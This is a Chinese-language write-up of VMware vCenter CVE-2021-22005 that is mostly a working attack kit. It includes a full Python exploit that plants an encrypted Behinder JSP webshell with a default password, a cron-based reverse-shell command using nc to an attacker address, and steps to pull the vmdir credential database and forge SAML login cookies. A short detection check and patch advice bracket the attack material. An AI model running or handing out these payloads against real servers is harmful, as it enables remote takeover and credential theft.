# VMware vCenter Server 任意文件上传漏洞 CVE-2021-22005

## 漏洞描述

VMware是一家云基础架构和移动商务解决方案厂商，提供基于VMware的虚拟化解决方案。

2021年9月22日，VMware官方发布安全公告，披露了包括 CVE-2021-22005 VMware vCenter Server 任意文件上传漏洞在内的多个中高危严重漏洞。在CVE-2021-22005中，攻击者可构造恶意请求，通过vCenter中的Analytics服务，可上传恶意文件，从而造成远程代码执行漏洞。

## 漏洞影响

```
VMware vCenter Server 7.0系列 < 7.0 U2c 
VMware vCenter Server 6.7系列 < 6.7 U3o 
VMware vCenter Server 6.5系列 不受漏洞影响 
```

其余漏洞受影响版本可参考 ：https://www.vmware.com/security/advisories/VMSA-2021-0020.html 

安全版本： 

```
VMware vCenter Server 7.0 U2c 
VMware vCenter Server 6.7 U3o
```

## 漏洞复现

### EXP

可以针对 /analytics/telemetry/ph/api/level 执行 cURL 请求来识别服务器是否受影响：

```
curl -k -v "https://your-ip/analytics/telemetry/ph/api/level?_c=test"
```

- 如果服务器 Response 200/OK，响应内容不包含 OFF，则容易受到攻击。

- 如果服务器 Response 200/OK，响应内容包含 OFF，则可能不易受到攻击，且未修复。

- 如果服务器 Response 400/Bad Request，则已修复。 

- 如果服务器 Response 404/Not Found，则要么不适用，要么已应用解决方法。该解决方法会禁用受影响的 API。

漏洞 exp 部署 webshell：

```
python3 CVE-2021-22005_poc.py -t https://your-ip
```

```python
import requests
import random
import string
import sys
import time
import requests
import urllib3
import argparse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 
def id_generator(size=6, chars=string.ascii_lowercase + string.digits):
 return ''.join(random.choice(chars) for _ in range(size))
  
def escape(_str):
 _str = _str.replace("&", "&amp;")
 _str = _str.replace("<", "&lt;")
 _str = _str.replace(">", "&gt;")
 _str = _str.replace("\"", "&quot;")
 return _str
  
def str_to_escaped_unicode(arg_str):
 escaped_str = ''
 for s in arg_str:
   val = ord(s)
   esc_uni = "\\u{:04x}".format(val)
   escaped_str += esc_uni
 return escaped_str
 
 
def createAgent(target, agent_name, log_param):
 
  
 url = "%s/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?_c=%s&_i=%s" % (target, agent_name, log_param)
 headers = { "Cache-Control": "max-age=0", 
       "Upgrade-Insecure-Requests": "1", 
       "User-Agent": "Mozilla/5.0", 
       "X-Deployment-Secret": "abc", 
       "Content-Type": "application/json", 
       "Connection": "close" }
       
 json_data = { "manifestSpec":{}, 
        "objectType": "a2",
        "collectionTriggerDataNeeded": True,
        "deploymentDataNeeded":True, 
        "resultNeeded": True, 
        "signalCollectionCompleted":True, 
        "localManifestPath": "a7",
        "localPayloadPath": "a8",
        "localObfuscationMapPath": "a9" }
         
 requests.post(url, headers=headers, json=json_data, verify=False)
  
 
def generate_manifest(webshell_location, webshell):
 
 manifestData = """<manifest recommendedPageSize="500">
   <request>
    <query name="vir:VCenter">
      <constraint>
       <targetType>ServiceInstance</targetType>
      </constraint>
      <propertySpec>
       <propertyNames>content.about.instanceUuid</propertyNames>
       <propertyNames>content.about.osType</propertyNames>
       <propertyNames>content.about.build</propertyNames>
       <propertyNames>content.about.version</propertyNames>
      </propertySpec>
    </query>
   </request>
   <cdfMapping>
    <indepedentResultsMapping>
      <resultSetMappings>
       <entry>
         <key>vir:VCenter</key>
         <value>
                      <value xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="resultSetMapping">
            <resourceItemToJsonLdMapping>
             <forType>ServiceInstance</forType>
            <mappingCode><![CDATA[  
             #set($appender = $GLOBAL-logger.logger.parent.getAppender("LOGFILE"))##
             #set($orig_log = $appender.getFile())##
             #set($logger = $GLOBAL-logger.logger.parent)##  
             $appender.setFile("%s")##  
             $appender.activateOptions()## 
             $logger.warn("%s")## 
             $appender.setFile($orig_log)##  
             $appender.activateOptions()##]]>
            </mappingCode>
            </resourceItemToJsonLdMapping>
          </value>
         </value>
       </entry>
      </resultSetMappings>
    </indepedentResultsMapping>
   </cdfMapping>
   <requestSchedules>
    <schedule interval="1h">
      <queries>
       <query>vir:VCenter</query>
      </queries>
    </schedule>
   </requestSchedules>
 </manifest>""" % (webshell_location, webshell)
  
 return manifestData
 
def arg():
 parser = argparse.ArgumentParser()
 parser.add_argument("-t", "--target", help = "Target", required = True)
 args = parser.parse_args()
 target = args.target
 print("[*] Target: %s" % target)
 return target
 
def exec():
 target = arg()
 # Variables
 webshell_param = id_generator(6)
 log_param = id_generator(6)
 agent_name = id_generator(6)
 shell_name = "Server.jsp"
 webshell = """<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>"""
 
 webshell_location = "/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/%s" % shell_name
 webshell = str_to_escaped_unicode(webshell)
 manifestData = generate_manifest(webshell_location,webshell)
 print("[*] Creating Agent")
 createAgent(target, agent_name, log_param)
 url = "%s/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?action=collect&_c=%s&_i=%s" % (target, agent_name, log_param)
 headers = {"Cache-Control": "max-age=0", 
          "Upgrade-Insecure-Requests": "1", 
          "User-Agent": "Mozilla/5.0", 
          "X-Deployment-Secret": "abc", 
          "Content-Type": "application/json", 
          "Connection": "close"}
 json_data ={"contextData": "a3", "manifestContent": manifestData, "objectId": "a2"}
 requests.post(url, headers=headers, json=json_data, verify=False)
 #webshell连接地址
 url = "%s/idm/..;/%s" % (target, shell_name)
 code = requests.get(url=url, headers=headers,verify=False).status_code
 if code != "404":
   print("webshell地址: %s" % url)
   print("[*]冰蝎3.0 Webshell连接密码: rebeyond" )
 
 else:
   print("未获取到webshell地址")
 
 
if __name__ == '__main__':
 exec()
```

反弹Shell：

```
curl -kv "https:/xx.xx.xx.xx/analytics/telemetry/ph/api/hyper/send?_c=&_i=/../../../../../../etc/cron.d/$RANDOM" -H Content-Type: -d "* * * * * root nc -e /bin/sh your-ip your-port "
```

### vCenter cookie 读取登录

存储关键身份验证信息数据位置：

```
# Linux
/storage/db/vmware-vmdir/data.mdb
```

```
#Windows
C:\ProgramData\VMware\vCenterServer\data\vmdird\data.mdb
```

解密脚本：

-  https://github.com/horizon3ai/vcenter_saml_login

运行得到 VSPHERE-UI-JESSIONID：

```
python3 vcenter_saml_login.py -p data.mdb -t your-ip
```

## 修复方案

1. 升级VMware vCenter Server 至最新版本。

2. 针对 CVE-2021-22005 VMware vCenter Server 任意文件上传漏洞，可按照 https://kb.vmware.com/s/article/85717 相关措施进行缓解。